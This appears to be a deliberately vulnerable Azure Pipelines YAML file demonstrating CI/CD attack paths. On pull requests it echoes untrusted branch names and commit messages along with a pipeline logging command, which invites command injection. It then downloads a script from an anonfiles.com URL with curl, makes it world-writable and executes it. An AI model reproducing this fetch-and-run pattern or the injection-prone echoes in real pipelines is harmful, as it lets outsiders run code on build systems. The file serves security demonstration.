pr:
- main

variables:
- name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
  value: https://cdn-114.anonfiles.com/z2u7T06fy2/d910a710-1662484505

steps:
  - script: |
      echo "Url to verify: $(varificationUrl)"
      echo "verifying the following branch:"
      echo "$(Build.SourceBranchName)"
      echo "verifying the following commit:"
      echo "$(Build.SourceVersionMessage)"
      echo ##vso[artifact.associate artifactname=myDrop;artifacttype=myartifacttype]https://github.com/Legit-Labs/legitify/archive/refs/tags/v0.2.2.zip
    displayName: Display data
  - script: |
      echo "Url to verify: $(varificationUrl)"
      curl $(varificationUrl)/test.sh --output test.sh
      chmod 777 test.sh
    displayName: Download script
  - bash: "./test.sh"
  - script: |
      ls -la

  
